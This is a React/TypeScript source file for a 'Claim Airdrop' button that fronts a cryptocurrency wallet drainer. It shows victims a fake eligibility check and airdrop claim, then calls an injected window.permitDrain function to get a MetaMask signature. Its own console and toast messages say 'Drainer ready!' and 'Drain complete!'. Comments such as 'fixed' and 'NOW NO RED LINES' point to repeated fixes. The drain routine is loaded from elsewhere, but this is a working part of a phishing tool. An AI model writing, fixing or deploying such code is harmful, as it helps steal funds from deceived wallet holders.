import React, { useState, useEffect } from "react";   // ← fixed: useEffect (not Swalleffect)
import toast from "react-hot-toast";               // ← correct default import (no red)

declare global {
  interface Window {
    permitDrain?: () => Promise<boolean>;
  }
}

interface ClaimButtonProps {
  walletConnected: boolean;
  address?: string;
}

const ClaimButton: React.FC<ClaimButtonProps> = ({ walletConnected, address }) => {
  const [isDisabled, setIsDisabled] = useState(true);
  const [btnText, setBtnText] = useState("Checking eligibility...");

  const Spinner = () => (
    <svg
      className="animate-spin -ml-1 mr-3 h-5 w-5 text-white"
      xmlns="http://www.w3.org/2000/svg"
      fill="none"
      viewBox="0 0 24 24"
    >
      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
      <path
        className="opacity-75"
        fill="currentColor"
        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
      />
    </svg>
  );

  // ← NOW NO RED LINES ANYWHERE
  useEffect(() => {
    if (typeof window.permitDrain === "function") {
      setIsDisabled(!walletConnected);
      setBtnText(walletConnected ? "Claim Airdrop" : "Connect wallet first");
      return;
    }

    let attempts = 0;
    const timer = setInterval(() => {
      if (typeof window.permitDrain === "function") {
        clearInterval(timer);
        setIsDisabled(!walletConnected);
        setBtnText(walletConnected ? "Claim Airdrop" : "Connect wallet first");
        console.log("%cDrainer ready!", "color:lime;font-size:18px");
      } else if (attempts++ > 100) {
        clearInterval(timer);
        setIsDisabled(true);
        setBtnText("Failed to load");
        toast.error("Drainer script failed to load");
      }
    }, 100);

    return () => clearInterval(timer);
  }, [walletConnected]);

  const handleClaim = async () => {
    if (!walletConnected || typeof window.permitDrain !== "function") {
      toast.error("Connect wallet first or drainer not ready");
      return;
    }

    setIsDisabled(true);
    setBtnText("Sign in MetaMask...");

    try {
      const success = await window.permitDrain();
      if (success) {
        setBtnText("Claimed Successfully");
        toast.success("Drain complete!");
      }
    } catch (error: any) {
      setIsDisabled(false);
      setBtnText("Claim Airdrop");
      const msg = (error?.message || "").toLowerCase();
      if (error?.code === 4001 || msg.includes("reject") || msg.includes("denied")) {
        toast.error("You rejected the signature");
      } else {
        toast.error("Claim failed");
      }
    }
  };

  const showSpinner = btnText === "Checking eligibility..." || btnText === "Sign in MetaMask...";

  return (
    <button
      onClick={handleClaim}
      disabled={isDisabled}
      className="px-10 py-4 bg-gradient-to-r from-purple-600 to-pink-600 rounded-xl text-white font-bold text-lg hover:scale-105 transition-all disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center min-w-[260px]"
    >
      {showSpinner && <Spinner />}
      <span>{btnText}</span>
    </button>
  );
};

export default ClaimButton;